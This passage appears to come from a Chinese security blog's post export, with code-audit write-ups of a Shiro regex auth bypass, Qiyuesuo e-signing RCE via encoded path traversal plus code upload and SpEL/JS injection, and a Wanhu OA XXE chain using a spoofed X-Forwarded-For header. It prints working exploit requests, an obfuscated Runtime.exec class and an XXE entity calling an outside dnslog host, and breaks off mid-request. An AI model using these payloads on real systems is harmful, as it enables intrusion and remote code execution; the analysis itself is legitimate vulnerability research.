(4ra1n)\n配置\n\n\n漏洞复现\n漏洞分析这个漏洞是当shiro配置RegExPatternMatcher来对路径进行匹配时所造成的漏洞，RegExPatternMatcher所使用匹配方式为正则匹配，.*代表匹配任意长度的任意字符串，唯独不包括换行，所以，当指定RegExPatternMatcher来进行路由匹配时，可通过换行绕过权限校验。\n\n\u0000\n漏洞修复增加匹配换行，caseInsensitive默认为false，32=&gt;0x20=&gt;Pattern.DOTALL表示匹配换行\n\n参考文章https://www.cnblogs.com/wmyskxz/p/10229148.html\nhttps://tttang.com/archive/1592/\nhttps://su18.org/post/shiro-5/\n","categories":["代码审计","漏洞分析"],"tags":["java代码审计"]},{"title":"契约锁代码执行漏洞分析","url":"/2024/05/09/%E5%A5%91%E7%BA%A6%E9%94%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"电子签约管理控制台定时任务RCE契约锁管理控制台的后台存在一个定时任务功能，可通过上传java代码执行。\n\n\n\n\n\n\n\n上传的接口为/api/code/upload，对应控制器为com.qiyuesuo.ucenter.CustomCodeController的upload方法。\n\n\n\n\n\n\n\n在处理上传的过程中，调用到com.qiyuesuo.code.CustomCodeServiceImpl的create方法时，会检测是否存在Runtime、Process、ProcessBuilder三个关键字，这个可以通过加载字节码的方式很容易绕过。\n\n\n\n\n\n\n\n\n\n\n后续会调用到com.qiyuesuo.core.compiling.javac.JavaDynamicCompiler的compileFile方法对传入的java源码进行编译，会调用loadClass加载类，但并未调用。\n\n\n\n\n\n\n\n通过CustomCode对象保存包名、类名等信息。\n\n\n\n\n\n\n\n最后返回CustomCode对象的id\n\n\n\n\n\n\n\n配置循环执行的次数和延期的时间或者定时表达式来执行上传的代码。\n\n\n\n\n\n\n\n点击确定以后会请求/api/utask/create接口，该接口对应com.qiyuesuo.utask.UserTaskController的create方法，调用this.timerService.addTask(record)添加到定时任务服务中。\n\n\n\n\n\n\n\n等待一段时间后，会自动调用到com.qiyuesuo.code.CustomCodeStrategyManager的loadCustomCode方法，加载并调用上传的java代码。\n\n\n\n\n\n\n\n权限绕过每次请求会经过的Filter，顺序从上自下。\n0 = &#123;ApplicationFilterConfig@34795&#125; \"ApplicationFilterConfig[name=corsFilter, filterClass=org.springframework.web.filter.CorsFilter]\"1 = &#123;ApplicationFilterConfig@34796&#125; \"ApplicationFilterConfig[name=ossRunWaitingFilter, filterClass=com.qiyuesuo.security.web.OssRunWaitingFilter]\"2 = &#123;ApplicationFilterConfig@34797&#125; \"ApplicationFilterConfig[name=securityConfigurer, filterClass=com.qiyuesuo.security.web.SecurityConfigurer]\"3 = &#123;ApplicationFilterConfig@34798&#125; \"ApplicationFilterConfig[name=characterEncodingFilter, filterClass=org.springframework.boot.web.servlet.filter.OrderedCharacterEncodingFilter]\"4 = &#123;ApplicationFilterConfig@34799&#125; \"ApplicationFilterConfig[name=webMvcMetricsFilter, filterClass=org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter]\"5 = &#123;ApplicationFilterConfig@34800&#125; \"ApplicationFilterConfig[name=formContentFilter, filterClass=org.springframework.boot.web.servlet.filter.OrderedFormContentFilter]\"6 = &#123;ApplicationFilterConfig@34801&#125; \"ApplicationFilterConfig[name=requestContextFilter, filterClass=org.springframework.boot.web.servlet.filter.OrderedRequestContextFilter]\"7 = &#123;ApplicationFilterConfig@34802&#125; \"ApplicationFilterConfig[name=riskUrlPreventFilter, filterClass=com.qiyuesuo.security.web.RiskUrlPreventFilter]\"8 = &#123;ApplicationFilterConfig@34803&#125; \"ApplicationFilterConfig[name=ukeyAuthenticationFilter, filterClass=com.qiyuesuo.security.ukey.UkeyAuthenticationFilter]\"9 = &#123;ApplicationFilterConfig@34804&#125; \"ApplicationFilterConfig[name=cloudHubAuthencationFilter, filterClass=com.qiyuesuo.security.cloudhub.CloudHubAuthencationFilter]\"10 = &#123;ApplicationFilterConfig@34805&#125; \"ApplicationFilterConfig[name=weChatAuthenticationFilter, filterClass=com.qiyuesuo.security.wechat.WeChatAuthenticationFilter]\"11 = &#123;ApplicationFilterConfig@34806&#125; \"ApplicationFilterConfig[name=casAuthenticationFilter, filterClass=com.qiyuesuo.security.cas.CasAuthenticationFilter]\"12 = &#123;ApplicationFilterConfig@34807&#125; \"ApplicationFilterConfig[name=oaAuthenticationFilter, filterClass=com.qiyuesuo.security.oa.OaAuthenticationFilter]\"13 = &#123;ApplicationFilterConfig@34808&#125; \"ApplicationFilterConfig[name=miniProgramAuthenticationFilter, filterClass=com.qiyuesuo.security.miniprogram.MiniProgramAuthenticationFilter]\"14 = &#123;ApplicationFilterConfig@34809&#125; \"ApplicationFilterConfig[name=oaAuthenticationV2Filter, filterClass=com.qiyuesuo.security.oa.OaAuthenticationV2Filter]\"15 = &#123;ApplicationFilterConfig@34810&#125; \"ApplicationFilterConfig[name=dingTalkAuthenticationFilter, filterClass=com.qiyuesuo.security.dingtalk.DingTalkAuthenticationFilter]\"16 = &#123;ApplicationFilterConfig@34811&#125; \"ApplicationFilterConfig[name=ssoAuthenticationFilter, filterClass=com.qiyuesuo.security.sso.SSOAuthenticationFilter]\"17 = &#123;ApplicationFilterConfig@34812&#125; \"ApplicationFilterConfig[name=feiShuAuthenticationFilter, filterClass=com.qiyuesuo.security.feishu.FeiShuAuthenticationFilter]\"18 = &#123;ApplicationFilterConfig@34813&#125; \"ApplicationFilterConfig[name=snsAuthenticationFilter, filterClass=com.qiyuesuo.security.sns.SnsAuthenticationFilter]\"19 = &#123;ApplicationFilterConfig@34814&#125; \"ApplicationFilterConfig[name=defaultAuthenticationFilter, filterClass=com.qiyuesuo.security.web.DefaultAuthenticationFilter]\"20 = &#123;ApplicationFilterConfig@34815&#125; \"ApplicationFilterConfig[name=securityContextFilter, filterClass=com.qiyuesuo.security.web.SecurityContextFilter]\"21 = &#123;ApplicationFilterConfig@25656&#125; \"ApplicationFilterConfig[name=timestampFilter, filterClass=com.qiyuesuo.security.web.TimestampFilter]\"22 = &#123;ApplicationFilterConfig@34816&#125; \"ApplicationFilterConfig[name=logoutFilter, filterClass=com.qiyuesuo.security.logout.LogoutFilter]\"23 = &#123;ApplicationFilterConfig@34817&#125; \"ApplicationFilterConfig[name=responsibilityFilter, filterClass=com.qiyuesuo.security.responsibility.ResponsibilityFilter]\"24 = &#123;ApplicationFilterConfig@34818&#125; \"ApplicationFilterConfig[name=accessControlFilter, filterClass=com.qiyuesuo.security.access.AccessControlFilter]\"25 = &#123;ApplicationFilterConfig@34819&#125; \"ApplicationFilterConfig[name=indepFilter, filterClass=com.qiyuesuo.indep.IndepFilter]\"26 = &#123;ApplicationFilterConfig@34820&#125; \"ApplicationFilterConfig[name=paramsFilter, filterClass=com.qiyuesuo.security.web.ParamsFilter]\"27 = &#123;ApplicationFilterConfig@25567&#125; \"ApplicationFilterConfig[name=resourceUrlEncodingFilter, filterClass=org.springframework.web.servlet.resource.ResourceUrlEncodingFilter]\"28 = &#123;ApplicationFilterConfig@34821&#125; \"ApplicationFilterConfig[name=whiteHostFilter, filterClass=com.qiyuesuo.security.web.WhiteHostFilter]\"29 = &#123;ApplicationFilterConfig@34822&#125; \"ApplicationFilterConfig[name=Tomcat WebSocket (JSR356) Filter, filterClass=org.apache.tomcat.websocket.server.WsFilter]\"\n\n对用户鉴权方法在AccessControlFilter的doFilterInternal方法中，调用了this.isAllow(request, response)方法处理路径鉴权逻辑。\n\n\n\n\n\n\n\n在isAllow方法中，匹配请求路径，如果在白名单中，则放行，如果不在白名单中，则验证cookie，最终如果返回true则执行doFilter，返回false则返回登录失效，并跳转到登录页面。\n\n\n\n\n\n\n\n调用this.securityProperties.getAllowedPatterns()方法获取无需登录即可访问的路径。\n\n\n\n\n\n\n\n0 = \"/api/setup*\"1 = \"/api/setup/**\"2 = \"/api/error*\"3 = \"/api/logout*\"4 = \"/api/nacos/**\"5 = \"/api/dubbo/**\"6 = \"/api/sys/config/name\"7 = \"/api/version/info\"8 = \"/api/license/check\"9 = \"/api/license/get\"10 = \"/api/license/get/env\"11 = \"/api/captcha/**\"12 = \"/api/login/**\"13 = \"/api/multiauth\"14 = \"/api/qys/oss/basePath\"15 = \"/api/sys/config/oss\"16 = \"/api/sys/config/develop/environment\"17 = \"/api/v3/api-docs/ucenter\"18 = \"/api/sys/config/obtainConvertConfig\"19 = \"/favicon.ico\"20 = \"/qysoss/assets/**\"21 = \"/login*\"22 = \"/api/login*\"23 = \"/qys/oss/basePath\"24 = \"/setup*\"25 = \"/setup/**\"26 = \"/checkHealth\"\n\n在matchesRequestURI方法中，调用request.getRequestURI()获取请求的路径，遍历allowedPatterns中的路径，调用this.pathMatcher.matches(pattern, requestUri)方法逐个验证。\n\n\n\n\n\n\n\n当匹配规则为/api/setup*时，只能匹配到/api/setupxxx这类url，不能匹配/api/setup/a\n\n\n\n\n\n\n\n\n\n\n当匹配规则为/api/setup/**时，可以匹配到/api/setup/aaaa/aaaa/aaa这类路由\n\n\n\n\n\n\n\n这里使用request.getRequestURI获取请求路径，这种方式存在一个安全隐患，当路径中存在..危险关键字并不会将其..剔除掉，所以在路径中添加/api/setup/../../api/code/upload也会被成功匹配到。\n\n\n\n\n\n\n\n请求经过Filter过滤器之后，会调用到DispatcherServlet类的doService方法，它是Spring MVC的核心，负责接收HTTP请求，并根据请求信息分发到相应的Controller进行处理，会对URL进行路径归一化处理。\n调用栈\ngetRequestUri:382, UrlPathHelper (org.springframework.web.util)getPathWithinApplication:298, UrlPathHelper (org.springframework.web.util)getLookupPathForRequest:186, UrlPathHelper (org.springframework.web.util)getHandlerInternal:363, AbstractHandlerMethodMapping (org.springframework.web.servlet.handler)getHandlerInternal:110, RequestMappingInfoHandlerMapping (org.springframework.web.servlet.mvc.method)getHandlerInternal:59, RequestMappingInfoHandlerMapping (org.springframework.web.servlet.mvc.method)getHandler:396, AbstractHandlerMapping (org.springframework.web.servlet.handler)getHandler:1234, DispatcherServlet (org.springframework.web.servlet)doDispatch:1016, DispatcherServlet (org.springframework.web.servlet)doService:943, DispatcherServlet (org.springframework.web.servlet)\n\n在调用到Controller之前，会调用this.decodeRequestString(request, uri)对URI进行一次解码。\n\n\n\n\n\n\n\n然后通过request.getServletPath()获取请求路径\n\n\n\n\n\n\n\n\n\n\n通过request.getServletPath()获取到的路径路径获取bean\n\n\n\n\n\n\n\n但是当通过/api/setup/../../api/code/upload进行访问时，会被拦截掉。\n\n\n\n\n\n\n\n这是因为在RiskUrlPreventFilter的doFilterInternal方法中，会对请求的url进行检测，如果url中包含RISK_URLS变量中的只，则不允许访问，其中就包括/..。\n\n\n\n\n\n\n\nstatic &#123;    RISK_URLS.add(\"/..\");    RISK_URLS.add(\"/services/AdminService\");    RISK_URLS.add(\"/services/FreeMarkerService\");    RISK_URLS.add(\"/actuator\");    RISK_URLS.add(\"/error.log\");    RISK_URLS.add(\"/errors.log\");&#125;\n\n由于会对路径做归一化处理，会进行url解码，而这里，我们可以将..进行URL编码即可绕过。\n\n\n\n\n\n\n\n漏洞复现TestTimerTask1.java\npackage com.qiyuesuo.utask.java;import javax.script.ScriptEngine;import javax.script.ScriptEngineManager;public class TestTimerTask1 extends BaseTimerTask  &#123;    static final long serialVersionUID = 1L;    @Override    public void execute() &#123;        final ScriptEngineManager scriptEngineManager = new ScriptEngineManager();        final ScriptEngine js = scriptEngineManager.getEngineByName(\"js\");        try &#123;            js.eval(\"java.lang.Run\"+\"time.getR\"+\"untime().exec(\\\"touch /tmp/success\\\");\");        &#125; catch (Exception e) &#123;            System.out.println(e);        &#125;    &#125;&#125;\n\n上传，并配置执行方式\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n电子签约签署平台表达式注入在接口/api/template/html/add，该接口对应com.qiyuesuo.api.TemplateHtmlController的addHtmlTemplate方法，该方法接收一个TemplateBean类型的bean，其中包含title、params等变量，首先会校验title不能为空并且不能超过100个字符长度。后续会获取该对象的params参数进行遍历，该参数是一个List对象，保存的是TemplateParam类型的对象，该对象存在一个属性值extensionParam，在160行会调用param.getExtensionParam()获取，并调用this.objectMapper.readValue将其转换成Map，然后会判断是否包含expression键，存在则获取该键，并调用this.checkExpression(newExpression)方法。\n\n\n\n\n\n\n\n在checkExpression方法中，传入newExpression参数会被当做js代码执行。\n\n\n\n\n\n\n\nTemplateBean对象的参数值完全可控，所以可以构造TemplateBean参数的params参数，将expression键值指定JS代码实现代码执行。\n权限绕过签约平台所经过的Filter过滤器\n0 = \"ApplicationFilterConfig[name=corsFilter, filterClass=org.springframework.web.filter.CorsFilter]\"1 = \"ApplicationFilterConfig[name=ossRunWaitingFilter, filterClass=com.qiyuesuo.security.web.OssRunWaitingFilter]\"2 = \"ApplicationFilterConfig[name=securityConfigurer, filterClass=com.qiyuesuo.security.web.SecurityConfigurer]\"3 = \"ApplicationFilterConfig[name=signRunWaitingFilter, filterClass=com.qiyuesuo.filter.SignRunWaitingFilter]\"4 = \"ApplicationFilterConfig[name=characterEncodingFilter, filterClass=org.springframework.boot.web.servlet.filter.OrderedCharacterEncodingFilter]\"5 = \"ApplicationFilterConfig[name=webMvcMetricsFilter, filterClass=org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter]\"6 = \"ApplicationFilterConfig[name=formContentFilter, filterClass=org.springframework.boot.web.servlet.filter.OrderedFormContentFilter]\"7 = \"ApplicationFilterConfig[name=requestContextFilter, filterClass=org.springframework.boot.web.servlet.filter.OrderedRequestContextFilter]\"8 = \"ApplicationFilterConfig[name=riskUrlPreventFilter, filterClass=com.qiyuesuo.security.web.RiskUrlPreventFilter]\"9 = \"ApplicationFilterConfig[name=zhanginFilter, filterClass=com.qiyuesuo.physics.zhangin.security.ZhanginFilter]\"10 = \"ApplicationFilterConfig[name=invalidSessionFilter, filterClass=com.qiyuesuo.security.web.InvalidSessionFilter]\"11 = \"ApplicationFilterConfig[name=qunjeV5LogoutFilter, filterClass=com.qiyuesuo.security.qunje.QunjeV5LogoutFilter]\"12 = \"ApplicationFilterConfig[name=qunjeV5AuthenticationFilter, filterClass=com.qiyuesuo.security.qunje.QunjeV5AuthenticationFilter]\"13 = \"ApplicationFilterConfig[name=qunjeV5ClientAuthenticationFilter, filterClass=com.qiyuesuo.security.qunje.QunjeV5ClientAuthenticationFilter]\"14 = \"ApplicationFilterConfig[name=weChatCallBackFilter, filterClass=com.qiyuesuo.security.wechat.WeChatCallBackFilter]\"15 = \"ApplicationFilterConfig[name=idCardAuthenticationFilter, filterClass=com.qiyuesuo.security.idcard.IdCardAuthenticationFilter]\"16 = \"ApplicationFilterConfig[name=ukeyAuthenticationFilter, filterClass=com.qiyuesuo.security.ukey.UkeyAuthenticationFilter]\"17 = \"ApplicationFilterConfig[name=cloudHubAuthencationFilter, filterClass=com.qiyuesuo.security.cloudhub.CloudHubAuthencationFilter]\"18 = \"ApplicationFilterConfig[name=weChatAuthenticationFilter, filterClass=com.qiyuesuo.security.wechat.WeChatAuthenticationFilter]\"19 = \"ApplicationFilterConfig[name=authConfigFilter, filterClass=com.qiyuesuo.security.AuthConfigFilter]\"20 = \"ApplicationFilterConfig[name=casAuthenticationFilter, filterClass=com.qiyuesuo.security.cas.CasAuthenticationFilter]\"21 = \"ApplicationFilterConfig[name=zhanginAuthenticationFilter, filterClass=com.qiyuesuo.physics.zhangin.security.ZhanginAuthenticationFilter]\"22 = \"ApplicationFilterConfig[name=oaAuthenticationFilter, filterClass=com.qiyuesuo.security.oa.OaAuthenticationFilter]\"23 = \"ApplicationFilterConfig[name=miniProgramAuthenticationFilter, filterClass=com.qiyuesuo.security.miniprogram.MiniProgramAuthenticationFilter]\"24 = \"ApplicationFilterConfig[name=oauth2AuthenticationFilter, filterClass=com.qiyuesuo.security.oauth2.OAuth2AuthenticationFilter]\"25 = \"ApplicationFilterConfig[name=oaAuthenticationV2Filter, filterClass=com.qiyuesuo.security.oa.OaAuthenticationV2Filter]\"26 = \"ApplicationFilterConfig[name=eofficeSSOAuthenticationFilter, filterClass=com.qiyuesuo.security.eoffice.EofficeSSOAuthenticationFilter]\"27 = \"ApplicationFilterConfig[name=wechatCheckFileFilter, filterClass=com.qiyuesuo.security.wechat.WechatCheckFileFilter]\"28 = \"ApplicationFilterConfig[name=dingTalkAuthenticationFilter, filterClass=com.qiyuesuo.security.dingtalk.DingTalkAuthenticationFilter]\"29 = \"ApplicationFilterConfig[name=ssoAuthenticationFilter, filterClass=com.qiyuesuo.security.sso.SSOAuthenticationFilter]\"30 = \"ApplicationFilterConfig[name=feiShuAuthenticationFilter, filterClass=com.qiyuesuo.security.feishu.FeiShuAuthenticationFilter]\"31 = \"ApplicationFilterConfig[name=welinkAuthenticationFilter, filterClass=com.qiyuesuo.security.welink.WelinkAuthenticationFilter]\"32 = \"ApplicationFilterConfig[name=miniProgramCheckFileFilter, filterClass=com.qiyuesuo.security.miniprogram.MiniProgramCheckFileFilter]\"33 = \"ApplicationFilterConfig[name=clientVersionFilter, filterClass=com.qiyuesuo.security.ClientVersionFilter]\"34 = \"ApplicationFilterConfig[name=snsAuthenticationFilter, filterClass=com.qiyuesuo.security.sns.SnsAuthenticationFilter]\"35 = \"ApplicationFilterConfig[name=DingtalkFilter, filterClass=com.qiyuesuo.security.dingtalk.DingtalkFilter]\"36 = \"ApplicationFilterConfig[name=welinkLoginFilter, filterClass=com.qiyuesuo.security.welink.WelinkLoginFilter]\"37 = \"ApplicationFilterConfig[name=defaultAuthenticationFilter, filterClass=com.qiyuesuo.security.web.DefaultAuthenticationFilter]\"38 = \"ApplicationFilterConfig[name=securityContextFilter, filterClass=com.qiyuesuo.security.web.SecurityContextFilter]\"39 = \"ApplicationFilterConfig[name=timestampFilter, filterClass=com.qiyuesuo.security.web.TimestampFilter]\"40 = \"ApplicationFilterConfig[name=zhanginUserAuthFilter, filterClass=com.qiyuesuo.physics.zhangin.security.ZhanginUserAuthFilter]\"41 = \"ApplicationFilterConfig[name=openUserAuthFilter, filterClass=com.qiyuesuo.security.OpenUserAuthFilter]\"42 = \"ApplicationFilterConfig[name=qunjeV5UserAuthFilter, filterClass=com.qiyuesuo.security.qunje.QunjeV5UserAuthFilter]\"43 = \"ApplicationFilterConfig[name=logoutFilter, filterClass=com.qiyuesuo.security.logout.LogoutFilter]\"44 = \"ApplicationFilterConfig[name=ssoUserAuthFilter, filterClass=com.qiyuesuo.security.SsoUserAuthFilter]\"45 = \"ApplicationFilterConfig[name=OpenOaRedirectFilter, filterClass=com.qiyuesuo.security.OpenOaRedirectFilter]\"46 = \"ApplicationFilterConfig[name=openOaAuthenticationFilter, filterClass=com.qiyuesuo.security.OpenOaAuthenticationFilter]\"47 = \"ApplicationFilterConfig[name=responsibilityFilter, filterClass=com.qiyuesuo.security.responsibility.ResponsibilityFilter]\"48 = \"ApplicationFilterConfig[name=accessControlFilter, filterClass=com.qiyuesuo.security.access.AccessControlFilter]\"49 = \"ApplicationFilterConfig[name=indepFilter, filterClass=com.qiyuesuo.indep.IndepFilter]\"50 = \"ApplicationFilterConfig[name=cloudHubCallBackFilter, filterClass=com.qiyuesuo.security.cloudhub.CloudHubCallBackFilter]\"51 = \"ApplicationFilterConfig[name=dingTalkCallBackFilter, filterClass=com.qiyuesuo.security.dingtalk.DingTalkCallBackFilter]\"52 = \"ApplicationFilterConfig[name=multiAuthenticationFilter, filterClass=com.qiyuesuo.security.MultiAuthenticationFilter]\"53 = \"ApplicationFilterConfig[name=versionInfoFilter, filterClass=com.qiyuesuo.filter.VersionInfoFilter]\"54 = \"ApplicationFilterConfig[name=paramsFilter, filterClass=com.qiyuesuo.security.web.ParamsFilter]\"55 = \"ApplicationFilterConfig[name=resourceUrlEncodingFilter, filterClass=org.springframework.web.servlet.resource.ResourceUrlEncodingFilter]\"56 = \"ApplicationFilterConfig[name=whiteHostFilter, filterClass=com.qiyuesuo.security.web.WhiteHostFilter]\"57 = \"ApplicationFilterConfig[name=categoryUpdateFilter, filterClass=com.qiyuesuo.category.CategoryUpdateFilter]\"58 = \"ApplicationFilterConfig[name=passThroughFilter, filterClass=com.qiyuesuo.contract.passthrough.PassThroughFilter]\"59 = \"ApplicationFilterConfig[name=Tomcat WebSocket (JSR356) Filter, filterClass=org.apache.tomcat.websocket.server.WsFilter]\"\n\n同样用户鉴权方法在AccessControlFilter的doFilterInternal方法中，调用了this.isAllow(request, response)方法处理路径鉴权逻辑。\n\n\n\n\n\n\n\n访问路径白名单\n0 = \"/api/captcha/**\"1 = \"/api/login*\"2 = \"/api/login/**\"3 = \"/api/callback/**\"4 = \"/api/company/auth/forwardinfo\"5 = \"/api/contract/summary\"6 = \"/api/sys/config/activemethod\"7 = \"/api/version/info\"8 = \"/api/version/check\"9 = \"/api/getIosAppInfo\"10 = \"/api/contract/ukeysign/**\"11 = \"/api/app/url\"12 = \"/api/contractqr/**\"13 = \"/api/pdfverifier*\"14 = \"/api/pdfverifier/**\"15 = \"/api/formSignatory/image\"16 = \"/api/formSignatory/get\"17 = \"/api/session/status\"18 = \"/api/user/change/mobile\"19 = \"/api/user/mobile/pin\"20 = \"/api/user/voice/pin\"21 = \"/api/user/get/mobile\"22 = \"/api/modifyphone\"23 = \"/api/sys/custom/config\"24 = \"/api/formSignatory/sign/v2/ukey\"25 = \"/api/physicaluploadthird/*\"26 = \"/api/ukey/login\"27 = \"/api/third/ukey/login\"28 = \"/api/sys/config/multipassword\"29 = \"/api/multiauth\"30 = \"/api/lk/*\"31 = \"/api/sys/config/skin\"32 = \"/api/contract/sweepcode/detail/*\"33 = \"/api/contract/sweepcode/pin\"34 = \"/api/company/logo/base64*\"35 = \"/api/company/logo/image*\"36 = \"/api/css\"37 = \"/api/binary/signbyukey\"38 = \"/api/sys/config/getbackgroundimage\"39 = \"/api/sys/config/getbackgroundconfig\"40 = \"/api/user/get/account\"41 = \"/api/user/setPwdAtLogin\"42 = \"/api/user/ukey/checkbind\"43 = \"/api/responsibility/config\"44 = \"/api/sys/config/icp\"45 = \"/api/sys/config/oss\"46 = \"/api/contract/sweepcode/pin\"47 = \"/api/qys/webapp/basePath\"48 = \"/api/error/outOfDate\"49 = \"/api/company/retrieve/company/check\"50 = \"/api/company/retrieve/user/check\"51 = \"/api/sys/config/sign/develop/environment\"52 = \"/api/user/retrieve/**\"53 = \"/api/user/avatar/image\"54 = \"/api/cert/getFromCloud\"55 = \"/api/risk/user/**\"56 = \"/api/idCard/*\"57 = \"/api/company/auth/forward/overview\"58 = \"/api/document/getOfdConfig\"59 = \"/api/sys/config/checkEmail\"60 = \"/api/indep/cancel/inner/all\"61 = \"/api/physicalqr/**/**\"62 = \"/api/msg/expire/check\"63 = \"/api/authentication/exchangeqid*\"64 = \"/api/pass/through/event\"65 = \"/api/msg/expire/signsilent/company/check\"66 = \"/api/sys/config/token/key\"67 = \"/qyswebapp/assets/**\"68 = \"/favicon.ico\"69 = \"/zhangin/js/*\"70 = \"/zhangin/css/*\"71 = \"/zhangin/favicon.*\"72 = \"/zhangin/apk/*.apk\"73 = \"/signaturethird\"74 = \"/signatureupload\"75 = \"/zhangin/index.html\"76 = \"/zhangin/img/**\"77 = \"/zhangin/fonts/**\"78 = \"/zhangin/build.json\"79 = \"/version/info\"80 = \"/login*\"81 = \"/login/**\"82 = \"/qys/webapp/basePath\"83 = \"/retrieve*\"84 = \"/user-retrieve*\"85 = \"/app/download\"86 = \"/anomalous\"87 = \"/error*\"88 = \"/verifier*\"89 = \"/privacy-protection\"90 = \"/retrieve*\"91 = \"/scanLogin*\"92 = \"/confirm-identity\"93 = \"/lpsealupload\"94 = \"/signature/upload\"95 = \"/face-login\"96 = \"/contractqrdetail/**\"97 = \"/contract-detail-open-qrcode/**\"98 = \"/physicalqrdetail/**\"99 = \"/WW_verify_*.txt\"100 = \"/sealer/**\"101 = \"/wechat/biz/callback\"102 = \"/cloudhub/callback\"103 = \"/dingtalk/callback\"104 = \"/dingtalk/newcallback\"105 = \"/dtlogin\"106 = \"/logout*\"107 = \"/welinklogin\"108 = \"/checkHealth\"109 = \"/contract/print/client/infos\"110 = \"/document/print/client/download\"111 = \"/contract/print/client/delete\"112 = \"/app/getCurrTime.htm\"113 = \"/app/console/check.htm\"114 = \"/console/sealApply/view.htm\"115 = \"/app/sealuse/image.htm\"116 = \"/app/console/sealApply/view.htm\"117 = \"/app/sys/compareVersion.htm\"118 = \"/zhangin/apk/download\"\n\n绕过原理跟管理控制一致。\n漏洞复现执行命令延时判断漏洞是否存在\nVChqYXZhLmxhbmcuVGhyZWFkKS5zbGVlcCg1MDAwKQ==T(java.lang.Thread).sleep(5000)\n\nPOST /login/%2e%2e/api/template/html/add HTTP/1.1Content-Type: application/jsonUser-Agent: Mozilla/5.0 (Linux; Android 4.1.2; Nexus 7 Build/JZ054K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19Accept-Encoding: gzip, deflateCache-Control: no-cachePragma: no-cacheHost: 172.20.10.9:9180Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Content-Length: 365Connection: close&#123;\"file\":\"test\",\"title\":\"test\",\"groupId\":\"1\",\"params\":[&#123;\"extensionParam\":\"&#123;\\\"expression\\\":\\\"var a=new org.springframework.expression.spel.standard.SpelExpressionParser();var b='VChqYXZhLmxhbmcuVGhyZWFkKS5zbGVlcCg1MDAwKQ==';var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),'UTF-8');var c=a.parseExpression(deStr);c.getValue();\\\"&#125;\"&#125;]&#125;\n\n\n\n\n\n\n\n\n参考文章https://xz.aliyun.com/t/12661\nhttps://evilpan.com/\nhttps://www.cnblogs.com/nice0e3/p/14801884.html#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F\n","categories":["代码审计","漏洞分析"],"tags":["java代码审计"]},{"title":"万户OA GeneralWeb SSRF组合RCE","url":"/2024/05/19/%E4%B8%87%E6%88%B7OA%20GeneralWeb%20SSRF%E7%BB%84%E5%90%88RCE/","content":"环境万户 oa 12.4.12.7\nXXE漏洞点在com.whir.service.common.CallApi的getResult方法中，传入input参数调用XXESAXBuilder.build对输入字符串解析，未配置安全策略，可构造特殊的xml语句实现XXE漏洞利用。\n\n\n\n\n\n\n\n在com.whir.service.webservice.GeneralWeb的OAManager方法中，调用了CallApi#getResult方法。\n\n\n\n\n\n\n\n该方法在META-INF/xfire/services.xml中定义，作为xfire框架的一个WebService服务。\n\n\n\n\n\n\n\n在web.xml配置，可通过/xfservices/GeneralWeb进行调用。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n权限绕过在web.xml中，配置了Filter，所有的请求都会经过com.whir.common.util.SetCharacterEncodingFilter#doFilter方法\n\n\n\n\n\n\n\n在159行，请求路径中存在/xfservices/GeneralWeb，则会调用this.judgeIsSecurityIP((HttpServletRequest)request)方法，判断请求的ip是否为白名单中的ip，如果请求ip不在白名单中则return null。\n\n\n\n\n\n\n\n在judgeIsSecurityIP方法中，通过IPUtil.getIpAddr(request)获取ip\n\n\n\n\n\n\n\ngetIpAddr方法中Header头中获取ip，可通过指定x-forwarded-for、Proxy-Client-IP、WL-Proxy-Client-IP指定ip。\n\n\n\n\n\n\n\n获取到IP后会判断是否在localhost、192.168.0、192.168.7中，在就会执行chain.doFilter。\n\n\n\n\n\n\n\n在请求头中指定x-forwarded-for: localhost，回显了Invalid SOAP request，说明执行到GeneralWeb中\n\n\n\n\n\n\n\ndnslog&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE aaa [&lt;!ENTITY name SYSTEM &quot;http://dnslog.cn&quot; &gt;]&gt;&lt;name&gt;&amp;name;&lt;/name&gt;\n\nPOST /defaultroot/xfservices/GeneralWeb HTTP/1.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: SESSIONIDOA=D7AA7CDC820C702A5A45F51AAB4B677A; LocLan=zh_CN; ezofficeDomainAccount=whir; empLivingPhoto=; ezofficeUserPortal=; ezofficePortal3=1; OASESSIONID=509378B8F4156297A82C8899060A9FBE; ezofficeUserName=admin; ezofficePortal0=; SESSIONIDOA=05A06A3BF1E3D38195AB69663E791C25x-forwarded-for: localhostConnection: closeSOAPAction: Content-Type: text/xml;charset=UTF-8Host: 172.20.10.132:7001Content-Length: 323&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:gen=\"http://com.whir.service/GeneralWeb\"&gt;   &lt;soapenv:Header/&gt;   &lt;soapenv:Body&gt;      &lt;gen:OAManager&gt;         &lt;!--type: string--&gt;   